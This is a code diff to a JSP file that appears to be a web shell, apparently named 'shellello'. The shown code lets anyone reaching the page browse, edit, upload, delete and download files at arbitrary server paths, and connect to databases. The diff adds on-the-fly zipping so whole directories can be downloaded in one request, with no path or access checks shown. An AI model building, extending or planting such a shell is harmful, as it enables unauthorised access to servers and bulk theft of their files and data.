@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
 <jsp:directive.page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" trimDirectiveWhitespaces="true"/>
-<jsp:directive.page import="java.io.*,java.nio.file.*,java.nio.charset.*,java.util.*,java.security.*,java.sql.*,java.text.*,javax.servlet.*,javax.servlet.http.*"/>
+<jsp:directive.page import="java.io.*,java.nio.file.*,java.nio.charset.*,java.util.*,java.util.zip.*,java.security.*,java.sql.*,java.text.*,javax.servlet.*,javax.servlet.http.*"/>
 
 <jsp:declaration><![CDATA[
 // ==========================================
@@ -348,7 +348,7 @@ private Connection getDbConnection(HttpSession session) throws Exception {
                 }
             }
         }
-    } else if ("postgres".equals(driver)) {
+    } else if ("postgresql".equals(driver) || "postgres".equals(driver)) {
         try {
             Class.forName("org.postgresql.Driver");
         } catch (ClassNotFoundException e) {
@@ -594,7 +594,39 @@ private void handleRenameItem(HttpServletRequest request, HttpServletResponse re
 private void handleDownload(HttpServletRequest request, HttpServletResponse response) throws IOException {
     String downloadPath = request.getParameter("path");
     File file = new File(downloadPath);
-    if (file.exists()) {
+    if (!file.exists()) {
+        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
+        response.setContentType("text/plain");
+        response.getWriter().write("File not found");
+        return;
+    }
+
+    if (file.isDirectory()) {
+        // Zip the folder on the fly
+        File tempZip = File.createTempFile("shellello_zip_", ".zip");
+        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(tempZip))) {
+            addToZip(file, file.getName(), zos);
+        } catch (Exception e) {
+            response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
+            response.setContentType("text/plain");
+            response.getWriter().write("Unable to zip folder. " + e.getMessage());
+            if (tempZip.exists()) tempZip.delete();
+            return;
+        }
+
+        response.setContentType("application/zip");
+        response.setHeader("Content-Disposition", "attachment; filename=" + file.getName() + ".zip");
+        try (FileInputStream fis = new FileInputStream(tempZip);
+             OutputStream os = response.getOutputStream()) {
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = fis.read(buffer)) != -1) {
+                os.write(buffer, 0, bytesRead);
+            }
+        } finally {
+            tempZip.delete();
+        }
+    } else {
         response.setContentType("application/octet-stream");
         response.setHeader("Content-Disposition", "attachment; filename=" + file.getName());
         try (FileInputStream fis = new FileInputStream(file);
@@ -605,6 +637,30 @@ private void handleDownload(HttpServletRequest request, HttpServletResponse resp
                 os.write(buffer, 0, bytesRead);
             }
         }
+    }
+}
+
+private void addToZip(File file, String entryName, ZipOutputStream zos) throws IOException {
+    if (file.isDirectory()) {
+        File[] children = file.listFiles();
+        if (children == null || children.length == 0) {
+            zos.putNextEntry(new ZipEntry(entryName + "/"));
+            zos.closeEntry();
+        } else {
+            for (File child : children) {
+                addToZip(child, entryName + "/" + child.getName(), zos);
+            }
+        }
+    } else {
+        zos.putNextEntry(new ZipEntry(entryName));
+        try (FileInputStream fis = new FileInputStream(file)) {
+            byte[] buffer = new byte[4096];
+            int bytesRead;
+            while ((bytesRead = fis.read(buffer)) != -1) {
+                zos.write(buffer, 0, bytesRead);
+            }
+        }
+        zos.closeEntry();
     }
 }
 
@@ -1248,7 +1304,7 @@ function renderFiles(files) {
         var acts = f.name === '..' ? '' : 
             (isDir ? '' : '<button class="action-btn" title="Edit" onclick="event.stopPropagation();editFile(decodeURIComponent(\'' + encodedPath + '\'))">📝</button>') +
             '<button class="action-btn" title="Rename" onclick="event.stopPropagation();showRename(decodeURIComponent(\'' + encodedPath + '\'),decodeURIComponent(\'' + encodedName + '\'))">✏️</button>' +
-            (isDir ? '' : '<button class="action-btn" title="Download" onclick="event.stopPropagation();download(decodeURIComponent(\'' + encodedPath + '\'))">⬇️</button>') +
+            '<button class="action-btn" title="Download" onclick="event.stopPropagation();downloadItem(decodeURIComponent(\'' + encodedPath + '\'), ' + (isDir ? 'true' : 'false') + ')">⬇️</button>' +
             '<button class="action-btn danger" title="Delete" onclick="event.stopPropagation();showDelete(decodeURIComponent(\'' + encodedPath + '\'),decodeURIComponent(\'' + encodedName + '\'))">🗑️</button>';
         html += '<tr ondblclick="' + dbl + '">' +
             '<td><span class="file-icon">' + icon + '</span><span class="' + cls + '">' + f.name + '</span></td>' +
@@ -1376,8 +1432,12 @@ function uploadFile() {
         });
 }
 
-function download(path) {
-    window.location.href = '?download=1&path=' + encodeURIComponent(path);
+function downloadItem(path, isDir) {
+    var url = '?download=1&path=' + encodeURIComponent(path);
+    if (isDir) {
+        toast('Zipping folder, please wait...', 'success');
+    }
+    window.location.href = url;
 }
 
 function showDelete(path, name) {
